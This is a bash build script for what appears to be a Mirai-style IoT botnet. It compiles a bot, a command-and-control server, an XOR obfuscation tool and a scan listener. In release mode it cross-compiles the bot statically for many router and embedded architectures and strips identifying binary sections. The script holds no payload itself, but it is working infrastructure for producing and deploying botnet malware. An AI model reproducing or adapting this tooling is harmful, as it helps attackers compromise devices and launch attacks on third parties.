#!/bin/bash

function compile_bot() {
    "$1-gcc" -std=c99 -static bot/*.c -g -w -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr $3
}

if [ $# == 0 ]; then
    echo "Usage: $0 <debug | release> "
elif [ "$1" == "debug" ]; then
    gcc -std=c99 bot/*.c -g -w -o debug/dbg
    echo -ne "\033[37;1mfinished compiling \033[31;1m[\033[37;1mdbg\033[31;1m]\r\n"
    gcc -std=c99 tools/xor.c -g -w -o debug/xor
    echo -ne "\033[37;1mfinished compiling \033[31;1m[\033[37;1mxor\033[31;1m]\r\n"
    gcc cnc/c2.c -g -w -pthread -s -Os -o debug/cnc -lpthread
    echo -ne "\033[37;1mfinished compiling \033[31;1m[\033[37;1mcnc\033[31;1m]\r\n"
    go build -o debug/scanListen tools/scanListen.go >/dev/null
    echo -ne "\033[37;1mfinished compiling \033[31;1m[\033[37;1mscanListen\033[31;1m]\r\n"

elif [ "$1" == "release" ]; then
    x86_64-gcc -std=c99 bot/*.c -static -g -w -o release/x86_64
    echo -ne "\033[37;1mfinished compiling \033[31;1m[\033[37;1mx86_64\033[31;1m] \033[37;1mfor binary \033[31;1m[\033[37;1mx86_64\033[31;1m]\033[0m\r\n"
    i586-gcc -std=c99 bot/*.c -static -g -w -o release/i586
    echo -ne "\033[37;1mfinished compiling \033[31;1m[\033[37;1mi586\033[31;1m] \033[37;1mfor binary \033[31;1m[\033[37;1mi586\033[31;1m]\033[0m\r\n"
    mips-gcc -std=c99 bot/*.c -static -g -w -o release/mips
    echo -ne "\033[37;1mfinished compiling \033[31;1m[\033[37;1mmips\033[31;1m] \033[37;1mfor binary \033[31;1m[\033[37;1mmips\033[31;1m]\033[0m\r\n"
    mipsel-gcc -std=c99 bot/*.c -static -g -w -o release/mipsel
    echo -ne "\033[37;1mfinished compiling \033[31;1m[\033[37;1mmipsel\033[31;1m] \033[37;1mfor binary \033[31;1m[\033[37;1mmipsel\033[31;1m]\033[0m\r\n"
    armv4l-gcc -std=c99 bot/*.c -static -g -w -o release/armv4l
    echo -ne "\033[37;1mfinished compiling \033[31;1m[\033[37;1marmv4l\033[31;1m] \033[37;1mfor binary \033[31;1m[\033[37;1marmv4l\033[31;1m]\033[0m\r\n"
    armv5l-gcc -std=c99 bot/*.c -static -g -w -o release/armv5l
    echo -ne "\033[37;1mfinished compiling \033[31;1m[\033[37;1marmv5l\033[31;1m] \033[37;1mfor binary \033[31;1m[\033[37;1marmv5l\033[31;1m]\033[0m\r\n"
    armv6l-gcc -std=c99 bot/*.c -static -g -w -o release/armv6l
    echo -ne "\033[37;1mfinished compiling \033[31;1m[\033[37;1marmv6l\033[31;1m] \033[37;1mfor binary \033[31;1m[\033[37;1marmv6l\033[31;1m]\033[0m\r\n"
    armv7l-gcc -std=c99 bot/*.c -static -g -w -o release/armv7l
    echo -ne "\033[37;1mfinished compiling \033[31;1m[\033[37;1marmv7l\033[31;1m] \033[37;1mfor binary \033[31;1m[\033[37;1marmv7l\033[31;1m]\033[0m\r\n"
    powerpc-gcc -std=c99 bot/*.c -static -g -w -o release/powerpc
    echo -ne "\033[37;1mfinished compiling \033[31;1m[\033[37;1mpowerpc\033[31;1m] \033[37;1mfor binary \033[31;1m[\033[37;1mpowerpc\033[31;1m]\033[0m\r\n"
    powerpc-440fp-gcc -std=c99 bot/*.c -static -g -w -o release/powerpc-440fp
    echo -ne "\033[37;1mfinished compiling \033[31;1m[\033[37;1mpowerpc-440fp\033[31;1m] \033[37;1mfor binary \033[31;1m[\033[37;1mpowerpc-440fp\033[31;1m]\033[0m\r\n"
    sparc-gcc -std=c99 bot/*.c -static -g -w -o release/sparc
    echo -ne "\033[37;1mfinished compiling \033[31;1m[\033[37;1msparc\033[31;1m] \033[37;1mfor binary \033[31;1m[\033[37;1msparc\033[31;1m]\033[0m\r\n"
    m68k-gcc -std=c99 bot/*.c -static -g -w -o release/m68k
    echo -ne "\033[37;1mfinished compiling \033[31;1m[\033[37;1mm68k\033[31;1m] \033[37;1mfor binary \033[31;1m[\033[37;1mm68k\033[31;1m]\033[0m\r\n"
    i686-gcc -std=c99 bot/*.c -static -g -w -o release/i686
    echo -ne "\033[37;1mfinished compiling \033[31;1m[\033[37;1mi686\033[31;1m] \033[37;1mfor binary \033[31;1m[\033[37;1mi686\033[31;1m]\033[0m\r\n"
    sh4-gcc -std=c99 bot/*.c -static -g -w -o release/sh4
    echo -ne "\033[37;1mfinished compiling \033[31;1m[\033[37;1msh4\033[31;1m] \033[37;1mfor binary \033[31;1m[\033[37;1msh4\033[31;1m]\033[0m\r\n"
else
    echo "Unknown parameter $1: $0 <debug | release>"
fi
